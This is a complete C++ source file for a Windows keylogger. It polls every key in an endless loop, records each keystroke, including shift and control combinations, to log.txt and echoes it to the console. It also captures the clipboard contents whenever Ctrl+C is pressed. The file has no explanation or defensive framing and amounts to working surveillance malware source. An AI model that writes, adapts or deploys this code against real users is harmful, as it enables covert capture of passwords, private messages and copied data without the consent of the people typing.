#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <string>

#include <iterator>
#include <algorithm>
#include <vector>
#include <cstdio>

//LETTERS
#define VK_KEY_A 65
#define VK_KEY_B 66
#define VK_KEY_C 67
#define VK_KEY_D 68
#define VK_KEY_E 69
#define VK_KEY_F 70
#define VK_KEY_G 71
#define VK_KEY_H 72
#define VK_KEY_I 73
#define VK_KEY_J 74
#define VK_KEY_K 75
#define VK_KEY_L 76
#define VK_KEY_M 77
#define VK_KEY_N 78
#define VK_KEY_O 79
#define VK_KEY_P 80
#define VK_KEY_Q 81
#define VK_KEY_R 82
#define VK_KEY_S 83
#define VK_KEY_T 84
#define VK_KEY_U 85
#define VK_KEY_V 86
#define VK_KEY_W 87
#define VK_KEY_X 88
#define VK_KEY_Y 89
#define VK_KEY_Z 90

//NUMS
#define VK_KEY_0 48
#define VK_KEY_1 49
#define VK_KEY_2 50
#define VK_KEY_3 51
#define VK_KEY_4 52
#define VK_KEY_5 53
#define VK_KEY_6 54
#define VK_KEY_7 55
#define VK_KEY_8 56
#define VK_KEY_9 57

//OTHER
#define VK_MNUM 12 //5 on numpad when disabled
#define VK_WINKEY1 91
#define VK_WINKEY2 92

std::string GetClipboardText() {
	// Try opening the clipboard
	if (! OpenClipboard(nullptr)){
		return std::string("ERROR: opening clipboard.");
	}
	
	// Get handle of clipboard object for ANSI text
	HANDLE hData = GetClipboardData(CF_TEXT);
	if (hData == nullptr){
		return std::string("ERROR: not ascii text.");
	}
	
	// Lock the handle to get the actual text pointer
	char * pszText = static_cast<char*>( GlobalLock(hData) );
	if (pszText == nullptr){
		return std::string("ERROR: geting text pointer.");
	}
	
	// Save text in a string class instance
	std::string text( pszText );
	
	// Release the lock
	GlobalUnlock( hData );
	
	// Release the clipboard
	CloseClipboard();
	
	return text;
}

void CaptureKeyPress(int key, std::string file) {
	
	std::ofstream OUTPUT_FILE;
	OUTPUT_FILE.open(file, std::ofstream::out | std::ofstream::app); // APPEND TO FILE >> log.txt
	
	std::string cb = GetClipboardText(); //get clipboard
	
	switch(key){
		
		//LETTERS
		case VK_KEY_A: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + A]";               std::cout << "[CTRL + A]";               }else{ OUTPUT_FILE << "A"; std::cout << "A"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + a]";               std::cout << "[CTRL + a]";               }else{ OUTPUT_FILE << "a"; std::cout << "a"; } } break; }
		case VK_KEY_B: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + B]";               std::cout << "[CTRL + B]";               }else{ OUTPUT_FILE << "B"; std::cout << "B"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + b]";               std::cout << "[CTRL + b]";               }else{ OUTPUT_FILE << "b"; std::cout << "b"; } } break; }
		case VK_KEY_C: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + C: " << cb << "]"; std::cout << "[CTRL + C: " << cb << "]"; }else{ OUTPUT_FILE << "C"; std::cout << "C"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + c: " << cb << "]"; std::cout << "[CTRL + c: " << cb << "]"; }else{ OUTPUT_FILE << "c"; std::cout << "c"; } } break; }
		case VK_KEY_D: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + D]";               std::cout << "[CTRL + D]";               }else{ OUTPUT_FILE << "D"; std::cout << "D"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + d]";               std::cout << "[CTRL + d]";               }else{ OUTPUT_FILE << "d"; std::cout << "d"; } } break; }
		case VK_KEY_E: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + E]";               std::cout << "[CTRL + E]";               }else{ OUTPUT_FILE << "E"; std::cout << "E"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + e]";               std::cout << "[CTRL + e]";               }else{ OUTPUT_FILE << "e"; std::cout << "e"; } } break; }
		case VK_KEY_F: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + F]";               std::cout << "[CTRL + F]";               }else{ OUTPUT_FILE << "F"; std::cout << "F"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + f]";               std::cout << "[CTRL + f]";               }else{ OUTPUT_FILE << "f"; std::cout << "f"; } } break; }
		case VK_KEY_G: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + G]";               std::cout << "[CTRL + G]";               }else{ OUTPUT_FILE << "G"; std::cout << "G"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + g]";               std::cout << "[CTRL + g]";               }else{ OUTPUT_FILE << "g"; std::cout << "g"; } } break; }
		case VK_KEY_H: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + H]";               std::cout << "[CTRL + H]";               }else{ OUTPUT_FILE << "H"; std::cout << "H"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + h]";               std::cout << "[CTRL + h]";               }else{ OUTPUT_FILE << "h"; std::cout << "h"; } } break; }
		case VK_KEY_I: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + I]";               std::cout << "[CTRL + I]";               }else{ OUTPUT_FILE << "I"; std::cout << "I"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + i]";               std::cout << "[CTRL + i]";               }else{ OUTPUT_FILE << "i"; std::cout << "i"; } } break; }
		case VK_KEY_J: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + J]";               std::cout << "[CTRL + J]";               }else{ OUTPUT_FILE << "J"; std::cout << "J"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + j]";               std::cout << "[CTRL + j]";               }else{ OUTPUT_FILE << "j"; std::cout << "j"; } } break; }
		case VK_KEY_K: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + K]";               std::cout << "[CTRL + K]";               }else{ OUTPUT_FILE << "K"; std::cout << "K"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + k]";               std::cout << "[CTRL + k]";               }else{ OUTPUT_FILE << "k"; std::cout << "k"; } } break; }
		case VK_KEY_L: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + L]";               std::cout << "[CTRL + L]";               }else{ OUTPUT_FILE << "L"; std::cout << "L"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + l]";               std::cout << "[CTRL + l]";               }else{ OUTPUT_FILE << "l"; std::cout << "l"; } } break; }
		case VK_KEY_M: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + M]";               std::cout << "[CTRL + M]";               }else{ OUTPUT_FILE << "M"; std::cout << "M"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + m]";               std::cout << "[CTRL + m]";               }else{ OUTPUT_FILE << "m"; std::cout << "m"; } } break; }
		case VK_KEY_N: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + N]";               std::cout << "[CTRL + N]";               }else{ OUTPUT_FILE << "N"; std::cout << "N"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + n]";               std::cout << "[CTRL + n]";               }else{ OUTPUT_FILE << "n"; std::cout << "n"; } } break; }
		case VK_KEY_O: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + O]";               std::cout << "[CTRL + O]";               }else{ OUTPUT_FILE << "O"; std::cout << "O"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + o]";               std::cout << "[CTRL + o]";               }else{ OUTPUT_FILE << "o"; std::cout << "o"; } } break; }
		case VK_KEY_P: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + P]";               std::cout << "[CTRL + P]";               }else{ OUTPUT_FILE << "P"; std::cout << "P"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + p]";               std::cout << "[CTRL + p]";               }else{ OUTPUT_FILE << "p"; std::cout << "p"; } } break; }
		case VK_KEY_Q: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + Q]";               std::cout << "[CTRL + Q]";               }else{ OUTPUT_FILE << "Q"; std::cout << "Q"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + q]";               std::cout << "[CTRL + q]";               }else{ OUTPUT_FILE << "q"; std::cout << "q"; } } break; }
		case VK_KEY_R: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + R]";               std::cout << "[CTRL + R]";               }else{ OUTPUT_FILE << "R"; std::cout << "R"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + r]";               std::cout << "[CTRL + r]";               }else{ OUTPUT_FILE << "r"; std::cout << "r"; } } break; }
		case VK_KEY_S: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + S]";               std::cout << "[CTRL + S]";               }else{ OUTPUT_FILE << "S"; std::cout << "S"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + s]";               std::cout << "[CTRL + s]";               }else{ OUTPUT_FILE << "s"; std::cout << "s"; } } break; }
		case VK_KEY_T: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + T]";               std::cout << "[CTRL + T]";               }else{ OUTPUT_FILE << "T"; std::cout << "T"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + t]";               std::cout << "[CTRL + t]";               }else{ OUTPUT_FILE << "t"; std::cout << "t"; } } break; }
		case VK_KEY_U: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + U]";               std::cout << "[CTRL + U]";               }else{ OUTPUT_FILE << "U"; std::cout << "U"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + u]";               std::cout << "[CTRL + u]";               }else{ OUTPUT_FILE << "u"; std::cout << "u"; } } break; }
		case VK_KEY_V: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + V]";               std::cout << "[CTRL + V]";               }else{ OUTPUT_FILE << "V"; std::cout << "V"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + v]";               std::cout << "[CTRL + v]";               }else{ OUTPUT_FILE << "v"; std::cout << "v"; } } break; }
		case VK_KEY_W: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + W]";               std::cout << "[CTRL + W]";               }else{ OUTPUT_FILE << "W"; std::cout << "W"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + w]";               std::cout << "[CTRL + w]";               }else{ OUTPUT_FILE << "w"; std::cout << "w"; } } break; }
		case VK_KEY_X: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + X]";               std::cout << "[CTRL + X]";               }else{ OUTPUT_FILE << "X"; std::cout << "X"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + x]";               std::cout << "[CTRL + x]";               }else{ OUTPUT_FILE << "x"; std::cout << "x"; } } break; }
		case VK_KEY_Y: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + Y]";               std::cout << "[CTRL + Y]";               }else{ OUTPUT_FILE << "Y"; std::cout << "Y"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + y]";               std::cout << "[CTRL + y]";               }else{ OUTPUT_FILE << "y"; std::cout << "y"; } } break; }
		case VK_KEY_Z: { if (GetKeyState(VK_LSHIFT) < 0){ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + Z]";               std::cout << "[CTRL + Z]";               }else{ OUTPUT_FILE << "Z"; std::cout << "Z"; }}else{ if (GetKeyState(VK_CONTROL) < 0){ OUTPUT_FILE << "[CTRL + z]";               std::cout << "[CTRL + z]";               }else{ OUTPUT_FILE << "z"; std::cout << "z"; } } break; }
		
		// //SPECIAL CHARS
		// case VK_OEM_1:	 { OUTPUT_FILE << "(: ;)";  break; }       //NOT WORKING!!!
        // case VK_OEM_102:  { OUTPUT_FILE << "(> <)";  break; }       //NOT WORKING!!!
        // case VK_OEM_2:	 { OUTPUT_FILE << "(? /)";  break; }       //NOT WORKING!!!
        // case VK_OEM_3:	 { OUTPUT_FILE << "(~ `)";  break; }       //NOT WORKING!!!
        // case VK_OEM_4:	 { OUTPUT_FILE << "({ [)";  break; }       //NOT WORKING!!!
        // case VK_OEM_5:	 { OUTPUT_FILE << "(| \\)"; break; }       //NOT WORKING!!!
        // case VK_OEM_6:	 { OUTPUT_FILE << "(} ])";  break; }       //NOT WORKING!!!
        // case VK_OEM_7:	 { OUTPUT_FILE << "(\" ')"; break; }       //NOT WORKING!!!
		
		//NUMBERS
		case VK_KEY_0: { if (GetKeyState(VK_LSHIFT) < 0){ OUTPUT_FILE << ")"; std::cout << ")"; }else{ OUTPUT_FILE << "0"; std::cout << "0"; } break; } 
		case VK_KEY_1: { if (GetKeyState(VK_LSHIFT) < 0){ OUTPUT_FILE << "!"; std::cout << "!"; }else{ OUTPUT_FILE << "1"; std::cout << "1"; } break; }
		case VK_KEY_2: { if (GetKeyState(VK_LSHIFT) < 0){ OUTPUT_FILE << "@"; std::cout << "@"; }else{ OUTPUT_FILE << "2"; std::cout << "2"; } break; }
		case VK_KEY_3: { if (GetKeyState(VK_LSHIFT) < 0){ OUTPUT_FILE << "#"; std::cout << "#"; }else{ OUTPUT_FILE << "3"; std::cout << "3"; } break; }
		case VK_KEY_4: { if (GetKeyState(VK_LSHIFT) < 0){ OUTPUT_FILE << "$"; std::cout << "$"; }else{ OUTPUT_FILE << "4"; std::cout << "4"; } break; }
		case VK_KEY_5: { if (GetKeyState(VK_LSHIFT) < 0){ OUTPUT_FILE << "%"; std::cout << "%"; }else{ OUTPUT_FILE << "5"; std::cout << "5"; } break; }
		case VK_KEY_6: { if (GetKeyState(VK_LSHIFT) < 0){ OUTPUT_FILE << "^"; std::cout << "^"; }else{ OUTPUT_FILE << "6"; std::cout << "6"; } break; }
		case VK_KEY_7: { if (GetKeyState(VK_LSHIFT) < 0){ OUTPUT_FILE << "&"; std::cout << "&"; }else{ OUTPUT_FILE << "7"; std::cout << "7"; } break; }
		case VK_KEY_8: { if (GetKeyState(VK_LSHIFT) < 0){ OUTPUT_FILE << "*"; std::cout << "*"; }else{ OUTPUT_FILE << "8"; std::cout << "8"; } break; }
		case VK_KEY_9: { if (GetKeyState(VK_LSHIFT) < 0){ OUTPUT_FILE << "("; std::cout << "("; }else{ OUTPUT_FILE << "9"; std::cout << "9"; } break; }
		
		//MOUSE
		case VK_LBUTTON: { break; } //USELESS. JUST MAKES THE HOLE LOG FILLED
		case VK_RBUTTON: { break; } //USELESS. JUST MAKES THE HOLE LOG FILLED
		case VK_MBUTTON: { break; } //USELESS. JUST MAKES THE HOLE LOG FILLED
		
		//MAIN
		case VK_ESCAPE: { OUTPUT_FILE << "[ESC]";  std::cout << "[ESC]";   break; }
		case VK_SPACE:  { OUTPUT_FILE << " ";      std::cout << " ";       break; }
		case VK_RETURN: { OUTPUT_FILE << "\n";     std::cout << "\n"; break; }
		case VK_BACK:   { OUTPUT_FILE << "[BACK]"; std::cout << "[BACK]";  break; }
		
		//LOCKS
		case VK_NUMLOCK: { OUTPUT_FILE << "[LOCK_NUM]"; std::cout << "[LOCK_NUM]"; break; }
		case VK_SCROLL:  { OUTPUT_FILE << "[LOCK_SCR]"; std::cout << "[LOCK_SCR]"; break; }
		case VK_CAPITAL: { OUTPUT_FILE << "[LOCK_CAP]"; std::cout << "[LOCK_CAP]"; break; }
		
		//SIDE
		case VK_SHIFT:   { break; } //NO NEED FOR OUTPUT WHEN YOU HAVE IT USED IN //LETTERS
	    case VK_CONTROL: { break; } //NO NEED FOR OUTPUT WHEN YOU HAVE IT USED IN //LETTERS
		case VK_TAB:     { OUTPUT_FILE << "[TAB]";  std::cout << "[TAB]";  break; }
		case VK_MENU:    { OUTPUT_FILE << "[ALT]";  std::cout << "[ALT]";  break; }
		case VK_WINKEY1: { OUTPUT_FILE << "[WIN1]"; std::cout << "[WIN1]"; break; }
		case VK_WINKEY2: { OUTPUT_FILE << "[WIN2]"; std::cout << "[WIN2]"; break; }
		
		//NUMPAD ON
		case VK_NUMPAD0:  { OUTPUT_FILE << "[NUM0]"; std::cout << "[NUM0]"; break; }
		case VK_NUMPAD1:  { OUTPUT_FILE << "[NUM1]"; std::cout << "[NUM1]"; break; }
		case VK_NUMPAD2:  { OUTPUT_FILE << "[NUM2]"; std::cout << "[NUM2]"; break; }
		case VK_NUMPAD3:  { OUTPUT_FILE << "[NUM3]"; std::cout << "[NUM3]"; break; }
		case VK_NUMPAD4:  { OUTPUT_FILE << "[NUM4]"; std::cout << "[NUM4]"; break; }
		case VK_NUMPAD5:  { OUTPUT_FILE << "[NUM5]"; std::cout << "[NUM5]"; break; }
		case VK_NUMPAD6:  { OUTPUT_FILE << "[NUM6]"; std::cout << "[NUM6]"; break; }
		case VK_NUMPAD7:  { OUTPUT_FILE << "[NUM7]"; std::cout << "[NUM7]"; break; }
		case VK_NUMPAD8:  { OUTPUT_FILE << "[NUM8]"; std::cout << "[NUM8]"; break; }
		case VK_NUMPAD9:  { OUTPUT_FILE << "[NUM9]"; std::cout << "[NUM9]"; break; }
		
		//NUMPAD OFF
		case VK_UP:    { OUTPUT_FILE << "[ARROW_UP]";    std::cout << "[ARROW_UP]";    break; } 
		case VK_DOWN:  { OUTPUT_FILE << "[ARROW_DOWN]";  std::cout << "[ARROW_DOWN]";  break; }
		case VK_LEFT:  { OUTPUT_FILE << "[ARROW_LEFT]";  std::cout << "[ARROW_LEFT]";  break; }
		case VK_RIGHT: { OUTPUT_FILE << "[ARROW_RIGHT]"; std::cout << "[ARROW_RIGHT]"; break; }
		//
		case VK_NEXT:  { OUTPUT_FILE << "[PG_UP]";       std::cout << "[PG_UP]";   break; }
		case VK_PRIOR: { OUTPUT_FILE << "[PG_DOWN]";     std::cout << "[PG_DOWN]"; break; }
		//
		case VK_HOME:  { OUTPUT_FILE << "[HOME]";        std::cout << "[HOME]"; break; }
		case VK_END:   { OUTPUT_FILE << "[END]";         std::cout << "[END]";  break; }
		//
		case VK_MNUM:  { break; }
		
		//NUMPAD EXTRA
		case VK_DIVIDE:   { OUTPUT_FILE << "/"; std::cout << "/"; break; }
		case VK_MULTIPLY: { OUTPUT_FILE << "*"; std::cout << "*"; break; }
	    case VK_SUBTRACT: { OUTPUT_FILE << "-"; std::cout << "-"; break; }
		case VK_ADD:      { OUTPUT_FILE << "+"; std::cout << "+"; break; }
		case VK_DECIMAL:  { OUTPUT_FILE << "."; std::cout << "."; break; }
		
		//F1, F2, ...
        case VK_F1:  { OUTPUT_FILE << "[F1]";  std::cout << "[F1]";  break; }
        case VK_F2:  { OUTPUT_FILE << "[F2]";  std::cout << "[F2]";  break; }
        case VK_F3:  { OUTPUT_FILE << "[F3]";  std::cout << "[F3]";  break; }
        case VK_F4:  { OUTPUT_FILE << "[F4]";  std::cout << "[F4]";  break; }
        case VK_F5:  { OUTPUT_FILE << "[F5]";  std::cout << "[F5]";  break; }
        case VK_F6:  { OUTPUT_FILE << "[F6]";  std::cout << "[F6]";  break; }
        case VK_F7:  { OUTPUT_FILE << "[F7]";  std::cout << "[F7]";  break; }
        case VK_F8:  { OUTPUT_FILE << "[F8]";  std::cout << "[F8]";  break; }
        case VK_F9:  { OUTPUT_FILE << "[F9]";  std::cout << "[F9]";  break; }
        case VK_F10: { OUTPUT_FILE << "[F10]"; std::cout << "[F10]"; break; }
        case VK_F11: { OUTPUT_FILE << "[F11]"; std::cout << "[F11]"; break; }
        case VK_F12: { OUTPUT_FILE << "[F12]"; std::cout << "[F12]"; break; }
        case VK_F13: { OUTPUT_FILE << "[F13]"; std::cout << "[F13]"; break; }
        case VK_F14: { OUTPUT_FILE << "[F14]"; std::cout << "[F14]"; break; }
        case VK_F15: { OUTPUT_FILE << "[F15]"; std::cout << "[F15]"; break; }
        case VK_F16: { OUTPUT_FILE << "[F16]"; std::cout << "[F16]"; break; }
        case VK_F17: { OUTPUT_FILE << "[F17]"; std::cout << "[F17]"; break; }
        case VK_F18: { OUTPUT_FILE << "[F18]"; std::cout << "[F18]"; break; }
        case VK_F19: { OUTPUT_FILE << "[F19]"; std::cout << "[F19]"; break; }
        case VK_F20: { OUTPUT_FILE << "[F20]"; std::cout << "[F20]"; break; }
        case VK_F21: { OUTPUT_FILE << "[F21]"; std::cout << "[F21]"; break; }
        case VK_F22: { OUTPUT_FILE << "[F22]"; std::cout << "[F22]"; break; }
        case VK_F23: { OUTPUT_FILE << "[F23]"; std::cout << "[F23]"; break; }
        case VK_F24: { OUTPUT_FILE << "[F24]"; std::cout << "[F24]"; break; }
		
		//OTHER
		case VK_SNAPSHOT: { OUTPUT_FILE << "[PrntScr]"; std::cout << "[PrntScr]"; break; }
		case VK_PAUSE:    { OUTPUT_FILE << "[PAUSE]";   std::cout << "[PAUSE]";   break; }
		case VK_INSERT:   { OUTPUT_FILE << "[INSERT]";  std::cout << "[INSERT]";  break; }
		case VK_DELETE:   { OUTPUT_FILE << "[DELETE]";  std::cout << "[DELETE]";  break; }
		case VK_SLEEP:    { OUTPUT_FILE << "[SLEEP]";   std::cout << "[SLEEP]";   break; }
		
		default: { OUTPUT_FILE << "[" << key << "]"; std::cout << "[" << key << "]"; break; }//IF KEY NOT MENTIONED IT WILL BE SAVED AS INT IN []
	}
	
	OUTPUT_FILE.close();
}

int main() {
	
	while(true) {
		for (int i = 0; i < 160; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				CaptureKeyPress(i, "log.txt");
			}
		}
	}
	
	return 0;
}